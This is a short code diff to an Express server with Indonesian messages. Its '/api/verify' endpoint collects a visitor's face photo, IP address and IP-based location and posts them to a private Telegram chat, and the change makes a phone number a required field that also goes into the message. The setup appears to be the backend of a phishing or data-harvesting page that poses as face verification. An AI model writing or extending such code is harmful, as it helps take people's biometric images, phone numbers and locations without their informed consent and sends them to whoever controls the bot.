@@ -31,8 +31,9 @@ app.post('/api/verify', async (req, res) => {
       return res.status(500).json({ ok: false, error: 'BOT_TOKEN / CHAT_ID belum diset di environment variable' });
     }
 
-    const { image } = req.body;
+    const { image, phone } = req.body;
     if (!image) return res.status(400).json({ ok: false, error: 'Foto tidak ada' });
+    if (!phone) return res.status(400).json({ ok: false, error: 'Nomor HP tidak ada' });
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     const lokasi = await getLocationFromIp(ip);
@@ -45,6 +46,7 @@ app.post('/api/verify', async (req, res) => {
     form.append('chat_id', CHAT_ID);
     form.append('caption',
       `🟡 Permintaan Verifikasi Wajah\n\n` +
+      `📱 No. HP: ${phone}\n` +
       `📍 Lokasi (perkiraan dari IP): ${lokasi}\n` +
       `🕒 Waktu: ${waktu} WIB\n` +
       `🌐 IP: ${ip}\n\n` +
